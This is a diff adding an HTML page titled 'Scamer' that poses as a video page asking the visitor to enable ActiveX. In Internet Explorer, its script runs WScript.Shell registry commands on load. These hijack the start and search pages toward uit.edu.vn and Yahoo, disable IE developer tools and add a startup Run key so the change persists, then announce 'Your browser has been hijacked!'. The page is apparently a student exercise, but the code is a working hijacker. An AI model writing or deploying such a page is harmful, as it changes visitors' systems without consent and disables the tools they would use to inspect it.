@@ -1,0 +1,67 @@
+<html>
+
+<head>
+    <title>Scamer</title>
+    <style>
+        body {
+            background-color: red;
+        }
+
+        #msg {
+            /* -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%);
+            position: absolute;
+            top: 30%;
+            left: 50%; */
+            text-align: center;
+            color: black;
+            font: bold;
+        }
+
+        #video {
+            display:block;
+            border-style:none;
+            margin-right: auto;
+            margin-left: auto;
+        }
+    </style>
+    
+</head>
+
+<body>
+    <h1 id="msg">Please enable ActiveX to play the video</h1>
+    <iframe id="video" width="420" height="315" src="https://www.youtube.com/embed/tgbNymZ7vqYY" frameborder="0"></iframe>
+    <script>
+        if (!(window.attachEvent && navigator.userAgent.indexOf('Opera') === -1)) {
+            // alert ( 'disable the registry operation is only valid in IE!'); 
+            document.getElementById("msg").innerHTML = "Have a good day sir! Nothing here!";
+        } else {
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.run('reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Start Page" /t REG_SZ /d "https://uit.edu.vn" /f');
+            shell.run('reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Search Page" /t REG_SZ /d "https://search.yahoo.com" /f');
+            shell.run('reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Default_Page_URL" /t REG_SZ /d "https://uit.edu.vn" /f');
+            shell.run('reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Default_Search_URL" /t REG_SZ /d "https://uit.edu.vn" /f');
+            shell.run('reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Start Page Redirect Cache" /t REG_SZ /d "https://uit.edu.vn" /f');
+            shell.run('reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Secondary Start Pages" /t REG_MULTI_SZ /d "https://student.uit.edu.vn\\0https://drl.uit.edu.vn" /f');
+    
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\IEDevTools" /v "Disabled" /t REG_DWORD /d 1 /f');
+
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}" /v "SortIndex" /t REG_DWORD /d 1 /f');
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}" /v "URL" /t REG_SZ /d "http://search.yahoo.com/search?q={searchTerms}&src=IE-SearchBox&FORM=IENTSR" /f');
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}" /v "NTURL" /t REG_SZ /d "http://search.yahoo.com/search?q={searchTerms}&src=IE-SearchBox&FORM=IENTSR" /f');
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}" /v "NTTopResultURL" /t REG_SZ /d "http://search.yahoo.com/search?q={searchTerms}&src=IE-SearchBox&FORM=IENTTR" /f');
+
+            // (In-testing) Add auto modifying "Secondary Start Pages" registry key at startup
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemSearch" /t REG_SZ /d "cmd /C powershell -command reg add \'HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\' /v \'Secondary Start Pages\' /t REG_MULTI_SZ /d \'https://student.uit.edu.vn\\0https://drl.uit.edu.vn\' /f" /f');
+            //shell.run("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemSearch\" /t REG_SZ /d \'powershell -command reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Secondary Start Pages\" /t REG_MULTI_SZ /d \"https://student.uit.edu.vn\\0https://drl.uit.edu.vn\" /f\" /f");
+
+            // Some decoration
+            document.querySelector("body").style.backgroundColor = "white";
+            document.getElementById("msg").innerHTML = "Your browser has been hijacked!";
+            document.getElementById("msg").style.color = "white";
+        }
+    </script>
+</body>
+
+
+</html>
